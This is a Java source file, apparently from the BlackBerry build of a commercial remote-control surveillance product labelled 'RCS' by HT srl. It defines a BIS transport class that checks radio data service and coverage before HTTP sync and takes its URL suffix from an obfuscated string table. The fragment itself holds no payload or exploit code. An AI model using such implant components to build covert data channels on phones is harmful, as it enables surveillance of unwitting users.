//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BisTransport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug("BisTransport", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public BisTransport(String host) {
        super(host);
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable"); //$NON-NLS-1$
        //#endif
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo
                .isCoverageSufficient(CoverageInfo.COVERAGE_BIS_B);

        //#ifdef DEBUG
        debug.trace("isAvailable bis: " + gprs + " & " + coverage); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        return gprs & coverage;
    }

    protected String getSuffix() {
        return Messages.getString("i.4"); //$NON-NLS-1$
    }

    //#ifdef DEBUG
    public String toString() {
        return "BisTransport " + host; //$NON-NLS-1$
    }
    //#endif
}
